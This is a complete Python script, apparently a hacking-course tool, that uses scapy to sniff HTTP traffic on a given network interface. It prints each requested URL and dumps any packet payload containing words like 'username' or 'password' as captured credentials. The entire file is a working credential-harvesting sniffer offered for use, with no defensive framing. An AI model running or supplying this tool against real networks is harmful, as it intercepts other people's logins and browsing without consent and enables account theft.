#!/usr/bin/env python
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
import scapy.all as scapy
from scapy.layers import http
import argparse
import subprocess
from colorama import init, Fore		# for fancy/colorful display

class Sniffer:
    def __init__(self):
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.RED   = Fore.RED
        self.Cyan = Fore.CYAN
        self.RESET = Fore.RESET

    def arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-i', '--interface', dest='interface', help='Specify The Interface')
        value = parser.parse_args()
        if not value.interface:
            parser.error(f'\n\n{self.RED}[-] Please Specify The Interface{self.RESET}')
        return value

    def sniff(self, interface):
        scapy.sniff(iface=interface, store=False, prn=self.process_packets)

    def get_url(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_login_info(self, packet):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['username', 'user', 'login', 'password', 'pass']
            for keyword in keywords:
                if str.encode(keyword) in load:     #Strings into bytes
                    return load

    def process_packets(self, packet):
        if packet.haslayer(http.HTTPRequest):
            url = self.get_url(packet)
            print(f'\n{self.GREEN}[+] Requested URLs are >> {url}{self.RESET}')
            login_info = self.get_login_info(packet)
            if login_info:
                print(f'\n{self.RED}[*] Usernames/Passwords  >> {login_info}{self.RESET}')

    def start(self):
        option = self.arguments()   # capture arguments
        subprocess.call(['clear'])
        print(f'{self.Cyan}\n\n\t\t\t\t\t#########################################################{self.RESET}')
        print(f'\n{self.Cyan}\t\t\t\t\t#\t\tCaptures Only HTTP Traffic\t\t#\n{self.Cyan}')
        print(f'{self.Cyan}\t\t\t\t\t#########################################################{self.RESET}\n\n')

        self.sniff(option.interface)    # start sniffing


if __name__ == "__main__":
    my_sniffer = Sniffer()
    my_sniffer.start()